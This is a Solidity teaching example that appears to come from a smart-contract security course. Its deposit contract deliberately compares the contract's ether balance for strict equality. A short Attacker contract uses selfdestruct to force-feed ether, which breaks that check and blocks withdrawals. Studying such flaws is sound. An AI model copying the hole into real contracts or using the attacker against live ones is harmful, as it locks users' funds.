// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;


/**
	@dev This contract includes an example of strict comparison of balance which is vulnerable to force feeding.
		Some ways of receiving ether are not preventable and could not be accounted for in this way.
	@custom:deployed-at ETHERSCAN URL
	@custom:exercise This contract is part of JC's basic examples at https://github.com/jcr-security/solidity-security-teaching-resources
*/ 
contract Example7 {

    mapping (address => uint256) balance;
	uint256 totalDeposit;
	

	///@notice We could remove receive() and fallback() to avoid SOME (NOT ALL) ether transfers
	///@notice This one was included to retrieve a custom error.
	receive() external payable {
		revert("Can't receive Eth!");
	}

    function deposit() external payable {
        balance[msg.sender] += msg.value;
		totalDeposit += msg.value;
    }
	

	function withdraw() external {		
		// Consistency check...
		assert(totalDeposit == address(this).balance); 	// Strict comparison of balance is vulnerable to force feeding Eth 
		totalDeposit -= balance[msg.sender];

		// Effects
		uint256 toWithdraw = balance[msg.sender];
		balance[msg.sender] = 0;	
		
		// Interactions
		(bool success, ) = payable(msg.sender).call{value: toWithdraw}("");
		require(success, "Low level call failed");

	}

}


/************************************** Attacker ************************************************/

contract Attacker {
	
	function forceFeedEth(address payable target) external payable {
		require(msg.value != 0, "No value sent!");
		selfdestruct(target);
	}

}